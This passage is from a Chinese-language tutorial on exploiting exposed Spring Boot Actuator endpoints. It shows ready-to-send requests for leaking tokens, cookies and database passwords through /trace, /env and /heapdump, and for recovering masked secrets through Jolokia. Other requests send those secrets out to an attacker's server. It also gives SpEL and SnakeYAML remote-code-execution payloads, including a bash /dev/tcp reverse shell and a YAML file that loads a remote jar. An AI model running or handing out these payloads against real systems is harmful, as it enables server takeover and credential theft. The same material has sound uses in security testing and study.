<p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p>
</li>
<li><p><code>/trace</code>、<code>/actuator/httptrace</code></p>
<p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p>
</li>
</ul>
<blockquote>
<p>除了上面一些端点路由，还有程序员自定义的根路径</p>
<ul>
<li>/manage、/management、项目APP相关名称</li>
<li>修改内置端点名字(如有些时候/env被程序员修改为/appenv)</li>
</ul>
</blockquote>
<h4 id="1-2-端点路由泄露导致敏感信息泄露"><a href="#1-2-端点路由泄露导致敏感信息泄露" class="headerlink" title="1.2.端点路由泄露导致敏感信息泄露"></a>1.2.端点路由泄露导致敏感信息泄露</h4><p><strong>认证字段的获取以证明可影响其他用户</strong></p>
<blockquote>
<p>这个主要通过访问/trace 路径获取用户认证字段信息，比如如下站点存在 actuator<br>配置不当漏洞，在其 trace 路径下，除了记录有基本的 HTTP 请求信息（时间戳、HTTP<br>头等），还有用户 token、cookie字段</p>
</blockquote>
<p>trace 路径：</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/d50c0dccc7f6b5f4a461764a2f7065b4.png)</p>
<p>用户字段泄露:</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/561692caae82f0847bc116f9873e09d1.png)</p>
<p>通过替换 token 字段可获取其他用户的信息</p>
<p><strong>数据库账户密码泄露</strong></p>
<p>由于 actuator 会监控站点 mysql、mangodb<br>之类的数据库服务，所以通过监控信息有时可以拿下 mysql、mangodb<br>数据库；这个主要通过/env 路径获取这些服务的配置信息，比如如下站点存在 actuator<br>配置不当漏洞，通过其/env 路径，可获得 mysql、mangodb 的用户名及密码：</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/db9fb7d5cba6a62bd56ea1cf07835469.png)</p>
<p><strong>Gitlab源代码泄露</strong></p>
<p>这个一般是在/health 路径，比如如下站点，访问其 health 路径可探测到站点 git<br>项目地址：</p>
<p>![](Spring Boot Actuator未授权访问利用实战利用/813b4e89bbaa2442f21e889e89be4d9c.png)</p>
<p><strong>后台用户账号密码泄露</strong></p>
<p>这个一般是在/heapdump 路径下，访问/heapdump 路径，返回 GZip 压缩 hprof<br>堆转储文件。在 Android studio<br>打开，会泄露站点内存信息，很多时候会包含后台用户的账号密码，泄露账号密码</p>
<h4 id="1-3获取星号脱敏的密码明文"><a href="#1-3获取星号脱敏的密码明文" class="headerlink" title="1.3获取星号脱敏的密码明文"></a>1.3获取星号脱敏的密码明文</h4><h5 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h5><blockquote>
<p>访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p>
</blockquote>
<h6 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li>
</ul>
<h6 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二:jolokia 调用相关 Mbean</strong> </p>
<p>这里需要获取的属性名为security.user,password，直接发包可以在响应包中的value键值中看到</p>
<ul>
<li>调用 <code>org.springframework.boot</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.boot:name=SpringApplication,type=Admin&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用 <code>org.springframework.cloud.context.environment</code> Mbean</li>
</ul>
<blockquote>
<p>实际上是调用 org.springframework.cloud.context.environment.EnvironmentManager 类实例的 getProperty 方法</p>
</blockquote>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/jolokia</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;mbean&quot;: &quot;org.springframework.cloud.context.environment:name=environmentManager,type=EnvironmentManager&quot;,&quot;operation&quot;: &quot;getProperty&quot;, &quot;type&quot;: &quot;EXEC&quot;, &quot;arguments&quot;: [&quot;security.user.password&quot;]&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li>调用其他 Mbean</li>
</ul>
<blockquote>
<p>目标具体情况和存在的 Mbean 可能不一样，可以搜索 getProperty 等关键词，寻找可以调用的方法。</p>
</blockquote>
<h5 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h5><h6 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>可以 GET 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/env</code> </li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用了 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖</li>
<li>目标可以请求攻击者的服务器（请求可出外网）</li>
</ul>
<h6 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二： 使用 nc 监听 HTTP 请求</strong></p>
<p>在自己控制的外网服务器上监听 80 端口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 80</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：  触发对外 http 请求</strong></p>
<p><code>eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</code>  </p>
<p><code>属性</code>替换为想要获取的目标属性</p>
<p><code>your-vps-ip</code> 换成自己外网服务器的真实 ip 地址</p>
<p><code>port</code>为前面监听的端口</p>
<ul>
<li><code>eureka.client.serviceUrl.defaultZone</code> 方法（<strong>不适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://value:$&#123;属性&#125;@your-vps-ip:port</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://value:$&#123;属性&#125;@your-vps-ip:port&quot;&#125;</span><br></pre></td></tr></table></figure>



<ul>
<li><code>spring.cloud.bootstrap.location</code> 方法（<strong>同时适用于</strong>明文数据中有特殊 url 字符的情况）</li>
</ul>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip:port/?=$&#123;属性&#125;</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip:port/?=$&#123;属性&#125;&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤四： 刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>步骤五： 解码属性值</strong></p>
<p>正常的话，此时 nc 监听的服务器会收到目标发来的请求，其中包含类似如下 <code>Authorization</code> 头内容：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Authorization: Basic dmFsdWU6MTIzNDU2</span><br></pre></td></tr></table></figure>

<p>将其中的 <code>dmFsdWU6MTIzNDU2</code>部分使用 base64 解码，即可获得类似明文值 <code>value:123456</code>，其中的 <code>123456</code> 即是目标星号 * 脱敏前的属性值明文。</p>
<h5 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a>方法三</h5><h6 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h6><ul>
<li>可正常 GET 请求目标 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口</li>
</ul>
<h6 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h6><p><strong>步骤一:确定属性名</strong></p>
<p>访问目标网站的/env或/actuator/env端点接口，全局搜索星号(*************)，通过被星号遮掩的属性值找到想要的目标属性</p>
<p><strong>步骤二:下载 jvm heap 信息</strong></p>
<blockquote>
<p>下载的 heapdump 文件大小通常在 50M—500M 之间，有时候也可能会大于 2G</p>
</blockquote>
<p><code>GET</code> 请求目标的 <code>/heapdump</code> 或 <code>/actuator/heapdump</code> 接口，下载应用实时的 JVM 堆信息</p>
<p><strong>步骤三:使用 MAT 获得 jvm heap 中的密码明文</strong></p>
<p>参考 <a target="_blank" rel="noopener" href="https://landgrey.me/blog/16/">文章</a> 方法，使用 <a target="_blank" rel="noopener" href="https://www.eclipse.org/mat/downloads.php">Eclipse Memory Analyzer</a> 工具的 <strong>OQL</strong> 语句 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))</span><br></pre></td></tr></table></figure>

<p>辅助用 “<strong>password</strong>“ 等关键词快速过滤分析，获得密码等相关敏感信息的明文。</p>
<h3 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h3><h4 id="2-1-whitelabel-error-page-SpEL-RCE"><a href="#2-1-whitelabel-error-page-SpEL-RCE" class="headerlink" title="2.1.whitelabel error page SpEL RCE"></a>2.1.whitelabel error page SpEL RCE</h4><h5 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
<li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
</ul>
<h5 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一: 找到目标网站正常传参点</strong></p>
<p>比如发现访问  <code>/xxxx?id=xxx</code> ，页面会报状态码为 500 的默认错误页面</p>
<p><strong>步骤二: 确认漏洞点</strong></p>
<p>输入 <code>/xxxx?id=$&#123;运算表达式&#125;</code> (假设运算表达式为7x7)</p>
<p>如果发现报错页面将 7x7 的值 49 计算出来并显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。</p>
<p><strong>步骤三: 命令执行漏洞利用</strong></p>
<p>运行代码将执行的命令字符串转换成 <code>0x**</code> java 字节形式(只需将target变量修改为需要执行的命令即可)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">target = <span class="string">&#x27;执行的命令&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> target:</span><br><span class="line">    result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x)) + <span class="string">&quot;,&quot;</span></span><br><span class="line"><span class="built_in">print</span>(result.rstrip(<span class="string">&#x27;,&#x27;</span>))</span><br></pre></td></tr></table></figure>



<p>执行 <code>open -a Calculator</code> 命令</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//ip:port/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x6f,0x70,0x65,0x6e,0x20,0x2d,0x61,0x20,0x43,0x61,0x6c,0x63,0x75,0x6c,0x61,0x74,0x6f,0x72&#125;))&#125;</span></span><br></pre></td></tr></table></figure>



<h5 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h5><p>环境是上面的资源集合的springboot-spel-rce，环境搭建参照上方</p>
<p>在搭建过程中可能会出现启动jar包时提示没有主清单属性，需要在pom.xml文件中添加依赖完成(参照文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44373935/article/details/90046451">点击这里</a>)</p>
<p>访问<a target="_blank" rel="noopener" href="https://127.0.0.1:9091/article?id=$%7B7*7%7D">https://127.0.0.1:9091/article?id=${7*7}</a></p>
<p>可以看到错误页面中花括号里面的表达式已经计算出来啦，49。此处参数点可利用</p>
<p>![image-20210827133545079](Spring Boot Actuator未授权访问利用实战利用/image-20210827133545079.png)</p>
<p>下面将花括号里面的修改成需要执行的命令</p>
<p>首先要将命令字符串转换为java字节形式，利用上面的python脚本</p>
<p>这里执行的命令为bash反弹shell，先将其进行base64编码转换(<a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">在线转换地址</a>)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt; &amp; /dev/tcp/192.168.233.243/9090  0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">转换后:</span><br><span class="line">bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4yNDMvOTA5MCAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure>



<p>在将其转换为java字节</p>
<p>![image-20210827151659784](Spring Boot Actuator未授权访问利用实战利用/image-20210827151659784.png)</p>
<p>使用nc监听192.168.233.243的9090端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9090</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>将转换后的java字节拼接到payload中，在浏览器中访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.233.243:9091/article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new%20String(new%20byte[]&#123;0x62,0x61,0x73,0x68,0x20,0x2d,0x63,0x20,0x7b,0x65,0x63,0x68,0x6f,0x2c,0x59,0x6d,0x46,0x7a,0x61,0x43,0x41,0x74,0x61,0x53,0x41,0x2b,0x4a,0x69,0x41,0x76,0x5a,0x47,0x56,0x32,0x4c,0x33,0x52,0x6a,0x63,0x43,0x38,0x78,0x4f,0x54,0x49,0x75,0x4d,0x54,0x59,0x34,0x4c,0x6a,0x49,0x7a,0x4d,0x79,0x34,0x79,0x4e,0x44,0x4d,0x76,0x4f,0x54,0x41,0x35,0x4d,0x43,0x41,0x77,0x50,0x69,0x59,0x78,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x65,0x36,0x34,0x2c,0x2d,0x64,0x7d,0x7c,0x7b,0x62,0x61,0x73,0x68,0x2c,0x2d,0x69,0x7d&#125;))&#125;</span><br></pre></td></tr></table></figure>



<p>反弹shell成功</p>
<p>![image-20210827152313055](Spring Boot Actuator未授权访问利用实战利用/image-20210827152313055.png)</p>
<h5 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
<li>其中  <code>$&#123;&#125;</code>  包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
</ol>
<p>详细分析参见下文:</p>
<p>​    <a target="_blank" rel="noopener" href="https://www.cnblogs.com/litlife/p/10183137.html">SpringBoot SpEL表达式注入漏洞-分析与复现</a></p>
<h4 id="2-2Spring-clound-SnakeYAML-RCE"><a href="#2-2Spring-clound-SnakeYAML-RCE" class="headerlink" title="2.2Spring clound SnakeYAML RCE"></a>2.2Spring clound SnakeYAML RCE</h4><h5 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<h5 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一</strong>: <strong>托管yml和jar文件</strong></p>
<blockquote>
<p>首先在自己的机器上开启个python的http服务(或者使用apache和nginx)，然后将yml文件(访问jar包)和jar包放在根目录下，便于访问</p>
</blockquote>
<p>在根目录下放置yml文件，内容如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://your-ip-ip/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p>
<p><strong>步骤二： 设置 spring.cloud.bootstrap.location 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.cloud.bootstrap.location=http://your-vps-ip/example.yml</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example.yml&quot;&#125;</span><br></pre></td></tr></table></figure>



<p><strong>步骤三： 刷新配置</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="利用实例-1"><a href="#利用实例-1" class="headerlink" title="利用实例"></a><strong>利用实例</strong></h5><p>这里使用的是python开启http服务。当使用python开启http服务时，根目录为当前执行命令的目录，所以先把yml和jar包放置到根目录下在执行python命令开启http服务</p>
<p>在根目录下放置yml文件，内容如下:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!!javax.script.ScriptEngineManager [</span><br><span class="line">  !!java.net.URLClassLoader [[</span><br><span class="line">    !!java.net.URL [<span class="string">&quot;http://192.168.233.243/example.jar&quot;</span>]</span><br><span class="line">  ]]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>



<p>在根目录下放置example.jar包(需要执行的命令)，代码编写及编译方式参考 <a target="_blank" rel="noopener" href="https://github.com/artsploit/yaml-payload">yaml-payload</a></p>
<p>(代码也在网盘里面，为springcloud-snakeyaml-rce/yaml-payload/src/artsploit/AwesomeScriptEngineFactory.java)</p>
<p>只需将exec()里面修改为执行的命令即可</p>
<p>![image-20210827163442633](Spring Boot Actuator未授权访问利用实战利用/image-20210827163442633.png)</p>
<p>将其进行打包成jar包</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf example.jar -C src/ .</span><br></pre></td></tr></table></figure>



<p>使用python快速开启http服务</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>



<p>通过burp抓包并修改请求报文</p>
<p>![image-20210829225702843](Spring Boot Actuator未授权访问利用实战利用/image-20210829225702843.png)</p>
<p>然后修改请求报文/refresh，刷新配置文件</p>
<p>![image-20210829230055895](Spring Boot Actuator未授权访问利用实战利用/image-20210829230055895.png)</p>
<p>反弹shell成功</p>
<p>![image-20210829230223141](Spring Boot Actuator未授权访问利用实战利用/image-20210829230223141.png)</p>
<h5 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h5><ol>
<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
</ol>
<p>分析详情参见下文</p>
<p><a target="_blank" rel="noopener" href="https://b1ngz.github.io/exploit-spring-boot-actuator-spring-cloud-env-note/">Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记</a></p>
<h4 id="2-3-Eureka服务漏洞"><a href="#2-3-Eureka服务漏洞" class="headerlink" title="2.3.Eureka服务漏洞"></a><strong>2.3.Eureka服务漏洞</strong></h4><p>Eureka服务漏洞需要存在两个包</p>
<blockquote>
  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">spring-boot-starter-actuator（/refresh刷新配置需要）  </span><br><span class="line">spring-cloud-starter-netflix-eureka-client（功能依赖）</span><br></pre></td></tr></table></figure>
</blockquote>
<h5 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
<li>目标使用的  <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
</ul>
<blockquote>
<p>  Eureka-Client&lt;1.8.7，eureka服务多用于netflix组件中，可通过在&lt;<br>  span=””&gt;/env中搜寻Netflix关键字判断时候可能存在Eureka服务</p>
</blockquote>
<p>![](Spring Boot Actuator未授权访问利用实战利用/7af2a3cf6a49f6b649e1aacbeb4aacf7.png)</p>
<p>Eureka服务属性被设置为恶意的外部Eureka server<br>URL地址时，通过/refresh会触发目标机器请求远程URL,Eureka server<br>URL可通过在/env处POST数据进行更改</p>
<h5 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h5><p><strong>步骤一:  架设响应Xstream payload的网站</strong></p>
<p>提供一个依赖 Flask 并符合要求的 <a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
<p><strong>步骤二：监听反弹 shell 的端口</strong></p>
<p>一般使用 nc 监听端口，等待反弹 shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 监听端口</span><br></pre></td></tr></table></figure>



<p><strong>步骤三：设置 eureka.client.serviceUrl.defaultZone 属性</strong></p>
<p>spring 1.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example</span><br></pre></td></tr></table></figure>

<p>spring 2.x</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;eureka.client.serviceUrl.defaultZone&quot;,&quot;value&quot;:&quot;http://your-vps-ip/example&quot;&#125;</span><br></pre></td></tr></table></figure>



